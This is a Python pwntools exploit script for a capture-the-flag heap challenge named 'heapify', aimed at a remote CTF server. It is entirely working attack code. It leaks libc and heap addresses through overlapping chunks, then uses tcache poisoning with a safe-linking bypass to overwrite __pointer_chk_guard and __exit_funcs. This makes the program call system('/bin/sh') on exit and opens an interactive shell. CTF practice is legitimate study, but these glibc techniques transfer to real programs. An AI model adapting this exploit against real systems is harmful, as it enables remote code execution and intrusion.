from pwn import *

def alloc(size, data=b'A'):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)

def delete(idx):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    return p.recvline()[:-1]

def protect_ptr(x, y):
    # x -> y
    return (x >> 12) ^ y

# p = process('./heapify', env={'LD_PRELOAD': './libc.so.6'})
p = remote('challs.actf.co', 31501)
e = ELF('./heapify')
libc = ELF('./libc.so.6')
context.arch = 'amd64'
context.terminal = 'bash'

ofs_ptr_guard = -0x2890
ofs_exit_funcs = 0x21a838

alloc(0x18)     # 0
alloc(0x18)     # 1
delete(1)
alloc(0x3d8)    # 2
alloc(0x38)     # 3
alloc(0x28)     # 4
alloc(0x18, b'A'*0x18+p64(0x421))   # 5
delete(2)
alloc(0x3d8)    # 6
libc.address = u64(view(3).ljust(8, b'\0')) - 0x21ace0
log.info(f'libc: {hex(libc.address)}')

alloc(0x38)     # 7 (3)
delete(7)
heap = u64(view(3).ljust(8, b'\0')) << 12
log.info(f'heap: {hex(heap)}')

# Overwrite __pointer_chk_guard
alloc(0x18)     # 8
alloc(0x18)     # 9
alloc(0x18)     # 10
delete(10)
delete(9)
delete(8)
alloc(0x18, b'A'*0x18+p64(0x21)+p64(protect_ptr(heap+0x760, libc.address+ofs_ptr_guard)))     # 11
alloc(0x18)                 # 12
alloc(0x18, b'\0'*0x10)     # 13

# Overwrite __exit_funcs
addr_arg = next(libc.search(b'/bin/sh'))
fn = libc.symbols['system']
fn = ((fn<<17)&((1<<64)-1)) | (fn>>(64-17))
alloc(0x48)     # 14
alloc(0x48)     # 15
alloc(0x48)     # 16
delete(16)
delete(15)
delete(14)
alloc(0x48, b'A'*0x48+p64(0x51)+p64(protect_ptr(heap+0x7f0, libc.address+ofs_exit_funcs-0x8)))      # 17
alloc(0x48, flat([4, fn, addr_arg, 0]))     # 18
alloc(0x48, p64(heap+0x7e0)*2)              # 19
p.sendlineafter(b'choice: ', b'4')
p.interactive()
